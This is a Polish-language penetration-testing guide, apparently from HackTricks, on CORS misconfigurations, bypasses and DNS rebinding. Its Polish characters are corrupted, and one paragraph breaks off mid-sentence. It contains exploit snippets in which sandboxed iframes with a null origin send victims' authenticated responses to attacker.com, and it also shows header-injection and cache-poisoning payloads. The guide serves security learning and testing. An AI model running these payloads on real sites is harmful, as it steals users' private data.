# CORS - Konfiguracje bd贸w i bypass

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Czym jest CORS?

Standard Cross-Origin Resource Sharing (CORS) **umo偶liwia serwerom okrelenie, kto mo偶e uzyska dostp do ich zasob贸w** i **jakie metody 偶da HTTP s dozwolone** z zewntrznych 藕r贸de.

Polityka **tej samej domeny** wymaga, aby **serwer 偶dajcy** zasobu i serwer hostujcy **zas贸b** miay takie same protokoy (np. `http://`), nazwy domen (np. `internal-web.com`) i **porty** (np. 80). Zgodnie z t polityk, tylko strony internetowe z tej samej domeny i portu maj dostp do zasob贸w.

Zastosowanie polityki tej samej domeny w kontekcie `http://normal-website.com/example/example.html` jest przedstawione poni偶ej:

| Odwoany URL                              | Dostp dozwolony?                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Tak: Identyczny schemat, domena i port |
| `http://normal-website.com/example2/`     | Tak: Identyczny schemat, domena i port |
| `https://normal-website.com/example/`     | Nie: Inny schemat i port      |
| `http://en.normal-website.com/example/`   | Nie: Inna domena               |
| `http://www.normal-website.com/example/`  | Nie: Inna domena               |
| `http://normal-website.com:8080/example/` | Nie: Inny port*                |

*Internet Explorer ignoruje numer portu przy stosowaniu polityki tej samej domeny, co umo偶liwia ten dostp.

### Nag贸wek `Access-Control-Allow-Origin`

Ten nag贸wek mo偶e zezwala na **wiele 藕r贸de**, warto **`null`** lub dzik kart **`*`**. Jednak **偶aden przegldarka nie obsuguje wielu 藕r贸de**, a u偶ycie dzikiej karty `*` podlega **ograniczeniom**. (Dzika karta musi by u偶ywana samodzielnie, a jej u偶ycie w poczeniu z `Access-Control-Allow-Credentials: true` jest niedozwolone.)

Ten nag贸wek jest **wysyany przez serwer** w odpowiedzi na 偶danie zasobu midzydomenowego inicjowane przez witryn, a przegldarka automatycznie dodaje nag贸wek `Origin`.

### Nag贸wek `Access-Control-Allow-Credentials`

Domylnie 偶dania midzydomenowe s wykonywane bez uwierzytelnienia, takiego jak pliki cookie lub nag贸wek Autoryzacja. Jednak serwer midzydomenowy mo偶e zezwoli na odczyt odpowiedzi, gdy przesyane s uwierzytelniajce dane, ustawiajc nag贸wek `Access-Control-Allow-Credentials` na **`true`**.

Jeli ustawiono na `true`, przegldarka przesya dane uwierzytelniajce (pliki cookie, nag贸wki autoryzacji lub certyfikaty klienta TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Wstpne 偶danie

### Zrozumienie wstpnych 偶da w komunikacji midzydomenowej

Podczas inicjowania 偶dania midzydomenowego w okrelonych warunkach, takich jak u偶ycie **niestandardowej metody HTTP** (innej ni偶 HEAD, GET, POST), wprowadzenie nowych **nag贸wk贸w** lub u偶ycie specjalnej wartoci nag贸wka **Content-Type**, mo偶e by wymagane wstpne 偶danie. To wstpne 偶danie, wykorzystujce metod **`OPTIONS`**, su偶y poinformowaniu serwera o intencjach nadchodzcego 偶dania midzydomenowego, w tym o metodach HTTP i nag贸wkach, kt贸re ma zamiar u偶y.

Protok贸 **Cross-Origin Resource Sharing (CORS)** nakazuje sprawdzenie wstpne w celu okrelenia wykonalnoci 偶danego dziaania midzydomenowego poprzez weryfikacj dozwolonych metod, nag贸wk贸w i wiarygodnoci pochodzenia. Aby dokadnie zrozumie, jakie warunki omijaj konieczno wstpnego 偶dania, nale偶y zapozna si z obszernym przewodnikiem udostpnionym przez [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).

Nale偶y zauwa偶y, 偶e **brak wstpnego 偶dania nie znosi koniecznoci posiadania nag贸wk贸w autoryzacyjnych w odpowiedzi**. Bez tych nag贸wk贸w przegldarka nie jest w stanie przetworzy odpowiedzi na 偶danie midzydomenowe.

Przyjrzyjmy si poni偶szemu przykadowi wstpnego 偶dania, kt贸re ma na celu u偶ycie metody `PUT` wraz z niestandardowym nag贸wkiem o nazwie `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
W odpowiedzi serwer mo偶e zwr贸ci nag贸wki wskazujce akceptowane metody, dozwolony pochodzenie i inne szczeg贸y polityki CORS, jak pokazano poni偶ej:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- **`Access-Control-Allow-Headers`**: Ten nag贸wek okrela, kt贸re nag贸wki mog by u偶ywane podczas rzeczywistego 偶dania. Jest ustawiany przez serwer, aby wskaza dozwolone nag贸wki w 偶daniach od klienta.
- **`Access-Control-Expose-Headers`**: Poprzez ten nag贸wek serwer informuje klienta, kt贸re nag贸wki mog by ujawnione jako cz odpowiedzi, opr贸cz prostych nag贸wk贸w odpowiedzi.
- **`Access-Control-Max-Age`**: Ten nag贸wek wskazuje, jak dugo wyniki 偶dania przedwstpnego mog by przechowywane w pamici podrcznej. Serwer ustawia maksymalny czas, w sekundach, w kt贸rym informacje zwr贸cone przez 偶danie przedwstpne mog by ponownie u偶ywane.
- **`Access-Control-Request-Headers`**: Ten nag贸wek jest u偶ywany w 偶daniach przedwstpnych i jest ustawiany przez klienta, aby poinformowa serwer, kt贸re nag贸wki HTTP klient chce u偶y w rzeczywistym 偶daniu.
- **`Access-Control-Request-Method`**: Ten nag贸wek, r贸wnie偶 u偶ywany w 偶daniach przedwstpnych, jest ustawiany przez klienta, aby wskaza, jak metod HTTP zostanie u偶yta w rzeczywistym 偶daniu.
- **`Origin`**: Ten nag贸wek jest automatycznie ustawiany przez przegldark i wskazuje pochodzenie 偶dania midzydomenowego. Jest u偶ywany przez serwer do oceny, czy przychodzce 偶danie powinno by zezwolone czy odrzucone na podstawie polityki CORS.


Nale偶y zauwa偶y, 偶e zazwyczaj (w zale偶noci od typu zawartoci i ustawionych nag贸wk贸w) w 偶daniu **GET/POST nie jest wysyane 偶danie przedwstpne** (偶danie jest wysyane **bezporednio**), ale jeli chcesz uzyska dostp do **nag贸wk贸w/ciaa odpowiedzi**, musi zawiera nag贸wek _Access-Control-Allow-Origin_ zezwalajcy na to.\
**Dlatego CORS nie chroni przed CSRF (ale mo偶e by pomocny).**

### **呕danie przedwstpne lokalnej sieci**

1. **`Access-Control-Request-Local-Network`**: Ten nag贸wek jest doczany do 偶dania klienta, aby wskaza, 偶e zapytanie jest skierowane do zasobu lokalnej sieci. Su偶y jako znacznik informujcy serwer, 偶e 偶danie pochodzi z wewntrz lokalnej sieci.

2. **`Access-Control-Allow-Local-Network`**: W odpowiedzi serwery u偶ywaj tego nag贸wka, aby przekaza informacj, 偶e 偶dany zas贸b mo偶e by udostpniany podmiotom spoza lokalnej sieci. Dziaa jak zielone wiato dla udostpniania zasob贸w midzy r贸偶nymi granicami sieciowymi, zapewniajc kontrolowany dostp przy zachowaniu protoko贸w bezpieczestwa.

**Poprawna odpowied藕 zezwalajca na 偶danie lokalnej sieci** musi r贸wnie偶 zawiera w odpowiedzi nag贸wek `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Nale偶y zauwa偶y, 偶e adres IP **0.0.0.0** w systemie Linux umo偶liwia **ominicie** wymaga dostpu do lokalnego hosta, poniewa偶 ten adres IP nie jest uwa偶any za "lokalny".

Mo偶liwe jest r贸wnie偶 **ominicie wymaga dotyczcych sieci lokalnej**, jeli u偶yjesz **publicznego adresu IP lokalnego punktu kocowego** (takiego jak publiczny adres IP routera). Poniewa偶 w wielu przypadkach, nawet jeli **publiczny adres IP** jest u偶ywany, jeli jest to **z sieci lokalnej**, dostp zostanie udzielony.


{% endhint %}

## Wykorzystywalne bdy konfiguracji

Zauwa偶ono, 偶e ustawienie `Access-Control-Allow-Credentials` na **`true`** jest warunkiem wstpnym dla wikszoci **rzeczywistych atak贸w**. To ustawienie pozwala przegldarce na wysyanie powiadcze i odczytywanie odpowiedzi, zwikszajc skuteczno ataku. Bez tego korzy z zmuszenia przegldarki do wysania 偶dania zamiast samodzielnego wykonania tego czynu maleje, poniewa偶 wykorzystanie plik贸w cookie u偶ytkownika staje si niemo偶liwe.

### Wyjtek: Wykorzystanie lokalizacji sieciowej jako uwierzytelnienia

Istnieje wyjtek, w kt贸rym lokalizacja sieciowa ofiary dziaa jako forma uwierzytelnienia. Pozwala to na wykorzystanie przegldarki ofiary jako proxy, omijajc uwierzytelnianie oparte na adresie IP, aby uzyska dostp do aplikacji sieciowych. Ta metoda ma podobne skutki jak DNS rebinding, ale jest prostsza do wykorzystania.

### Odzwierciedlanie `Origin` w `Access-Control-Allow-Origin`

Teoretycznie jest mao prawdopodobne, 偶e warto nag贸wka `Origin` zostanie odzwierciedlona w `Access-Control-Allow-Origin` ze wzgldu na ograniczenia dotyczce czenia tych nag贸wk贸w. Jednak programici, kt贸rzy chc wczy CORS dla wielu adres贸w URL, mog dynamicznie generowa nag贸wek `Access-Control-Allow-Origin`, kopiujc warto nag贸wka `Origin`. Ten podejcie mo偶e wprowadza podatnoci, zwaszcza gdy atakujcy u偶ywa domeny o nazwie zaprojektowanej tak, aby wydawaa si wiarygodna, wprowadzajc w bd logik walidacji.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Wykorzystywanie pochodzenia `null`

Pochodzenie `null`, okrelone dla sytuacji takich jak przekierowania lub lokalne pliki HTML, zajmuje wyjtkow pozycj. Niekt贸re aplikacje umo偶liwiaj na biaej licie to pochodzenie w celu uatwienia lokalnego rozwoju, co nieumylnie pozwala dowolnej witrynie na udawanie pochodzenia `null` za pomoc osadzonego iframe w piaskownicy, co umo偶liwia ominicie ogranicze CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Techniki obejcia wyra偶e regularnych

Podczas napotkania biaej listy domen wa偶ne jest przetestowanie mo偶liwoci obejcia, takich jak doczenie domeny atakujcego do domeny z biaej listy lub wykorzystanie podatnoci na przejcie subdomeny. Dodatkowo, wyra偶enia regularne u偶ywane do walidacji domen mog pomija niuanse w konwencjach nazewnictwa domen, co stwarza kolejne mo偶liwoci obejcia.

### Zaawansowane techniki obejcia wyra偶e regularnych

Wzorce regex zwykle skupiaj si na znakach alfanumerycznych, kropce (.) i mylniku (-), pomijajc inne mo偶liwoci. Na przykad, nazwa domeny stworzona w taki spos贸b, aby zawiera znaki interpretowane inaczej przez przegldarki i wzorce regex, mo偶e obej kontrole bezpieczestwa. Spos贸b, w jaki Safari, Chrome i Firefox obsuguj znaki podkrelenia w subdomenach, ilustruje, jak takie rozbie偶noci mog by wykorzystane do obejcia logiki walidacji domeny.

**Aby uzyska wicej informacji i ustawie dotyczcych tego rodzaju obejcia, sprawd藕:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **i** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### Z wykorzystaniem XSS wewntrz subdomeny

Programici czsto wprowadzaj mechanizmy obronne, aby chroni si przed wykorzystaniem CORS poprzez uwzgldnienie na biaej licie domen, kt贸re maj uprawnienia do 偶dania informacji. Pomimo tych rodk贸w ostro偶noci, bezpieczestwo systemu nie jest w peni niezawodne. Obecno nawet jednej podatnej subdomeny na licie domen z biaej listy mo偶e otworzy drzwi do wykorzystania CORS poprzez inne podatnoci, takie jak XSS (Cross-Site Scripting).

Aby to zilustrowa, rozwa偶my scenariusz, w kt贸rym domena `requester.com` jest na biaej licie, aby uzyska dostp do zasob贸w z innej domeny, `provider.com`. Konfiguracja po stronie serwera mo偶e wyglda tak:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
W tej konfiguracji, wszystkie subdomeny `requester.com` maj dozwolony dostp. Jednak偶e, jeli subdomena, na przykad `sub.requester.com`, zostanie skompromitowana poprzez podatno na XSS, atakujcy mo偶e wykorzysta t sabo. Na przykad, atakujcy majcy dostp do `sub.requester.com` mo偶e wykorzysta podatno na XSS, aby omin polityki CORS i nielegalnie uzyska dostp do zasob贸w na `provider.com`.


### **Zatrucie pamici podrcznej po stronie serwera**

**[Z tej publikacji naukowej](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

Mo偶liwe jest, 偶e poprzez wykorzystanie zatrucia pamici podrcznej po stronie serwera za pomoc wstrzyknicia nag贸wka HTTP, mo偶na wywoa przechowywan podatno na Cross-Site Scripting (XSS). Ten scenariusz rozgrywa si, gdy aplikacja nie oczyszcza nag贸wka `Origin` z niedozwolonych znak贸w, co tworzy podatno szczeg贸lnie dla u偶ytkownik贸w przegldarek Internet Explorer i Edge. Te przegldarki traktuj znak `\r` (0x0d) jako prawidowy terminator nag贸wka HTTP, co prowadzi do podatnoci na wstrzyknicie nag贸wka HTTP.

Rozwa偶my nastpujce 偶danie, w kt贸rym manipulowany jest nag贸wek `Origin`:
```text
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer i Edge interpretuj odpowied藕 jako:
```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Podczas bezporedniego wykorzystania tej podatnoci poprzez wysanie bdnie sformuowanego nag贸wka przez przegldark internetow nie jest mo偶liwe, mo偶na jednak rcznie wygenerowa spreparowane 偶danie za pomoc narzdzi takich jak Burp Suite. Metoda ta mo偶e prowadzi do zapisania odpowiedzi w pamici podrcznej serwera i nieumylnego jej udostpnienia innym. Spreparowany adunek ma na celu zmian zestawu znak贸w strony na UTF-7, kodowanie znak贸w czsto zwizane z podatnociami XSS ze wzgldu na mo偶liwo kodowania znak贸w w taki spos贸b, 偶e mog by wykonane jako skrypt w okrelonych kontekstach.

Aby dowiedzie si wicej na temat podatnoci XSS przechowywanych, zobacz [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Uwaga**: Wykorzystanie podatnoci na wstrzykiwanie nag贸wk贸w HTTP, zwaszcza poprzez zatrucie pamici podrcznej po stronie serwera, podkrela kluczowe znaczenie walidacji i oczyszczania wszelkich dostarczanych przez u偶ytkownika danych, w tym nag贸wk贸w HTTP. Zawsze stosuj solidny model zabezpiecze, kt贸ry obejmuje walidacj danych wejciowych, aby zapobiec takim podatnociom.


### **Zatrucie pamici podrcznej po stronie klienta**

**[Z tej publikacji](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

W tym scenariuszu zaobserwowano wystpienie strony internetowej odzwierciedlajcej zawarto niestandardowego nag贸wka HTTP bez odpowiedniego kodowania. Konkretnie, strona internetowa odzwierciedla zawarto zawart w nag贸wku `X-User-id`, kt贸ry mo偶e zawiera zoliwy kod JavaScript, jak pokazano na przykadzie, gdzie nag贸wek zawiera znacznik obrazu SVG zaprojektowany do wykonania kodu JavaScript podczas adowania.

Polityki Cross-Origin Resource Sharing (CORS) umo偶liwiaj wysyanie niestandardowych nag贸wk贸w. Jednak bez bezporedniego renderowania odpowiedzi przez przegldark ze wzgldu na ograniczenia CORS, u偶yteczno takiego wstrzyknicia mo偶e wydawa si ograniczona. Krytyczny punkt pojawia si, gdy rozwa偶a si zachowanie pamici podrcznej przegldarki. Jeli nie jest okrelony nag贸wek `Vary: Origin`, mo偶liwe staje si zapisanie zoliwej odpowiedzi w pamici podrcznej przegldarki. Nastpnie ta zapisana odpowied藕 mo偶e by renderowana bezporednio podczas nawigacji do adresu URL, omijajc konieczno bezporedniego renderowania podczas pocztkowego 偶dania. Mechanizm ten zwiksza niezawodno ataku poprzez wykorzystanie pamici podrcznej po stronie klienta.

Aby zilustrowa ten atak, przedstawiono przykad skryptu JavaScript, kt贸ry ma by wykonany w rodowisku strony internetowej, na przykad za pomoc JSFiddle. Ten skrypt wykonuje prost czynno: wysya 偶danie do okrelonego adresu URL z niestandardowym nag贸wkiem zawierajcym zoliwy kod JavaScript. Po pomylnym zakoczeniu 偶dania pr贸buje nawigowa do docelowego adresu URL, co potencjalnie mo偶e spowodowa wykonanie wstrzyknitego skryptu, jeli odpowied藕 zostaa zapisana w pamici podrcznej bez odpowiedniego obsugiwania nag贸wka `Vary: Origin`.

Poni偶ej przedstawiono podsumowanie u偶ytego skryptu JavaScript do wykonania tego ataku:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, znane r贸wnie偶 jako Cross-Site Script Inclusion, to rodzaj podatnoci, kt贸ry wykorzystuje fakt, 偶e Same Origin Policy (SOP) nie ma zastosowania podczas doczania zasob贸w za pomoc znacznika skryptu. Wynika to z faktu, 偶e skrypty musz by doczane z r贸偶nych domen. Ta podatno umo偶liwia atakujcemu dostp i odczytanie dowolnej zawartoci, kt贸ra zostaa doczona za pomoc znacznika skryptu.

Ta podatno staje si szczeg贸lnie istotna w przypadku dynamicznego JavaScriptu lub JSONP (JSON z Paddingiem), zwaszcza gdy u偶ywane s informacje o uprawnieniach, takie jak ciasteczka, do uwierzytelniania. Podczas 偶dania zasobu z innej hosta, ciasteczka s doczane, co umo偶liwia atakujcemu ich dostp.

Aby lepiej zrozumie i zagodzi t podatno, mo偶na skorzysta z wtyczki BurpSuite dostpnej pod adresem [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Ta wtyczka mo偶e pom贸c zidentyfikowa i rozwiza potencjalne podatnoci XSSI w Twoich aplikacjach internetowych.

[**Dowiedz si wicej o r贸偶nych typach XSSI i jak je wykorzysta tutaj.**](xssi-cross-site-script-inclusion.md)

Spr贸buj doda **parametr `callback`** w 偶daniu. By mo偶e strona zostaa przygotowana do wysyania danych jako JSONP. W takim przypadku strona zwr贸ci dane z `Content-Type: application/javascript`, co umo偶liwi obejcie polityki CORS.

![](<../.gitbook/assets/image (229).png>)

### atwe (bezu偶yteczne?) obejcie

Jednym ze sposob贸w obejcia ograniczenia `Access-Control-Allow-Origin` jest poproszenie aplikacji internetowej o wykonanie 偶dania w Twoim imieniu i odesanie odpowiedzi. Jednak w tym scenariuszu dane uwierzytelniajce ostatecznej ofiary nie zostan wysane, poniewa偶 偶danie jest wykonywane do innej domeny.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Narzdzie to dostarcza serwer proxy, kt贸ry przekazuje Twoje 偶danie wraz z nag贸wkami, jednoczenie podszywajc si pod nag贸wek Origin, aby pasowa do 偶danej domeny. To skutecznie omija polityk CORS. Oto przykad u偶ycia z XMLHttpRequest:

2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Narzdzie to oferuje alternatywne podejcie do przekazywania 偶dania. Zamiast przekazywa Twoje 偶danie w niezmienionej postaci, serwer wykonuje wasne 偶danie z okrelonymi parametrami.

### Ominicie za pomoc Iframe + Popup

Mo偶esz **obej sprawdzanie CORS**, takie jak `e.origin === window.origin`, tworzc iframe i otwierajc z niego nowe okno. Wicej informacji na nastpnej stronie:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding za pomoc TTL

DNS rebinding za pomoc TTL to technika wykorzystywana do obejcia pewnych rodk贸w bezpieczestwa poprzez manipulowanie rekordami DNS. Oto jak to dziaa:

1. Atakujcy tworzy stron internetow i zmusza ofiar do jej odwiedzenia.
2. Nastpnie atakujcy zmienia DNS (IP) swojej wasnej domeny, aby wskazywa na stron internetow ofiary.
3. Przegldarka ofiary buforuje odpowied藕 DNS, kt贸ra mo偶e zawiera warto TTL (Time to Live), okrelajc, jak dugo rekord DNS powinien by uwa偶any za wa偶ny.
4. Po upywie TTL przegldarka ofiary wysya nowe 偶danie DNS, umo偶liwiajc atakujcemu wykonanie kodu JavaScript na stronie ofiary.
5. Utrzymujc kontrol nad adresem IP ofiary, atakujcy mo偶e zbiera informacje z ofiary, nie wysyajc 偶adnych ciasteczek do serwera ofiary.

Warto zauwa偶y, 偶e przegldarki maj mechanizmy buforowania, kt贸re mog zapobiec natychmiastowemu wykorzystaniu tej techniki, nawet przy niskich wartociach TTL.

DNS rebinding mo偶e by przydatny do obejcia jawnych sprawdze IP przeprowadzanych przez ofiar lub w przypadkach, gdy u偶ytkownik lub bot pozostaje na tej samej stronie przez du偶szy czas, co pozwala na wyganicie bufora.

Jeli potrzebujesz szybkiego sposobu na wykorzystanie DNS rebinding, mo偶esz skorzysta z usug takich jak [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Aby uruchomi wasny serwer DNS rebinding, mo偶esz skorzysta z narzdzi takich jak **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). Wymaga to udostpnienia lokalnego portu 53/udp, utworzenia rekordu A wskazujcego na ten port (np. ns.example.com) i utworzenia rekordu NS wskazujcego na wczeniej utworzon poddomen A (np. ns.example.com). Ka偶da poddomena poddomeny ns.example.com bdzie w贸wczas rozwizywana przez Tw贸j host.

Mo偶esz r贸wnie偶 korzysta z publicznie dziaajcego serwera pod adresem [http://rebind.it/singularity.html](http://rebind.it/singularity.html), aby lepiej zrozumie i eksperymentowa.

### DNS Rebinding za pomoc **zalewu pamici podrcznej DNS**

DNS rebinding za pomoc zalewu pamici podrcznej DNS to kolejna technika wykorzystywana do obejcia mechanizmu buforowania przegldarek i wymuszenia drugiego 偶dania DNS. Oto jak to dziaa:

1. Na pocztku, gdy ofiara wysya 偶danie DNS, otrzymuje adres IP atakujcego.
2. Aby obej obron buforowania, atakujcy wykorzystuje usug pracownika usugi. Pracownik usugi zalewa pami podrczn DNS, co skutecznie usuwa buforowany nazw serwera atakujcego.
3. Gdy przegldarka ofiary wysya drugie 偶danie DNS, otrzymuje teraz adres IP 127.0.0.1, kt贸ry zazwyczaj odnosi si do lokalnego hosta.

Poprzez zalewanie pamici podrcznej DNS za pomoc pracownika usugi, atakujcy mo偶e manipulowa procesem rozwizywania DNS i wymusi drugie 偶danie przegldarki ofiary, tym razem rozwizujc na 偶dany przez atakujcego adres IP.

### DNS Rebinding za pomoc **pamici podrcznej**

Innym sposobem obejcia obrony buforowania jest wykorzystanie wielu adres贸w IP dla tej samej poddomeny w dostawcy DNS. Oto jak to dziaa:

1. Atakujcy ustawia dwa rekordy A (lub pojedynczy rekord A z dwoma adresami IP) dla tej samej poddomeny w dostawcy DNS.
2. Gdy przegldarka sprawdza te rekordy, otrzymuje oba adresy IP.
3. Jeli przegldarka zdecyduje si najpierw u偶y adresu IP atakujcego, atakujcy mo偶e dostarczy payload, kt贸ry wykonuje 偶dania HTTP do tej samej domeny.
4. Jednak po uzyskaniu adresu IP ofiary, atakujcy przestaje odpowiada przegldarce ofiary.
5. Przegldarka ofiary, po stwierdzeniu, 偶e domena nie odpowiada, przechodzi do u偶ycia drugiego podanego adresu IP.
6. Przez dostp do drugiego adresu IP przegldarka omija polityk Same Origin Policy (SOP), co umo偶liwia atakujcemu wykorzystanie tego i pozyskanie informacji oraz ich eksfiltracj.

Ta technika wykorzystuje zachowanie przegldarek, gdy dla domeny podawane s multiple adresy IP. Poprzez strategiczne kontrolowanie odpowiedzi i manipulowanie wyborem adresu IP przez przegldark, atakujcy mo偶e wy
### Inne powszechne obejcia

* Jeli **nie s dozwolone wewntrzne adresy IP**, mogli **zapomnie zakaza 0.0.0.0** (dziaa w systemach Linux i Mac)
* Jeli **nie s dozwolone wewntrzne adresy IP**, odpowiedz z **CNAME** do **localhost** (dziaa w systemach Linux i Mac)
* Jeli **nie s dozwolone wewntrzne adresy IP** jako odpowiedzi DNS, mo偶na odpowiedzie **CNAME na wewntrzne usugi**, takie jak www.corporate.internal.

### Uzbrojone ataki DNS Rebidding

Wicej informacji na temat poprzednich technik obejcia i jak korzysta z narzdzia mo偶na znale藕 w prezentacji [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) to narzdzie do przeprowadzania atak贸w [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding). Zawiera niezbdne komponenty do ponownego powizania adresu IP serwera atakujcego z adresem IP docelowego komputera oraz do dostarczania adunk贸w ataku w celu wykorzystania podatnego oprogramowania na docelowym komputerze.

### Rzeczywista ochrona przed atakami DNS Rebinding

* U偶ywaj TLS w wewntrznych usugach
* Wymagaj uwierzytelnienia w celu uzyskania dostpu do danych
* Sprawdzaj nag贸wek Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Propozycja zawsze wysyania 偶dania pre-flight, gdy publiczne serwery chc uzyska dostp do wewntrznych serwer贸w

## **Narzdzia**

**Przeszukaj mo偶liwe bdy w politykach CORS**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Odwoania
* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)


<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

